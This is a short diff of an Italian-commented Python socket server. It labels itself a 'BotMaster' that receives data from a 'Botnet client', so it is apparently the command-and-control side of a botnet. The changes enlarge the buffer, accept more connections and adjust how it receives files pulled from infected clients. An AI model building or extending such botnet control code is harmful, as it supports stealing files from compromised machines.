@@ -1,13 +1,16 @@
 from socket import *
 import tqdm
+import select
 serverPort = 12003
  #Dimensione del buffer, in questo caso il messaggio ricevuto puo essere al piu 4kb ma possiamo ovviamente aumentare nel caso
-BUFFER_SIZE = 1024 * 16
+BUFFER_SIZE = 1024 * 128
 serverSocket = socket(AF_INET,SOCK_STREAM)
 serverName = gethostbyname(gethostname())
 serverSocket.bind(('',serverPort))
-serverSocket.listen(1)
+serverSocket.listen(10)
 print('Il BotMaster con indirizzo IP:',serverName, 'e\' pronto a ricevere le informazioni dalla Botnet client...')
+
+
 
 def invia_messaggio(messaggio):
     global connectionSocket
@@ -112,7 +115,8 @@ while True:
                         break
                     output = ricevi_messaggio()
                     if(output.split("<sep>")[0] !="Il file richiesto non esiste"):
-                        output = connectionSocket.recv(BUFFER_SIZE).decode()
+                        print("Attendo la size")        
+                        output = ricevi_messaggio()
                         size = int(output)
                         ricevi_file(cmd.split()[1],size)
                         output = ricevi_messaggio()
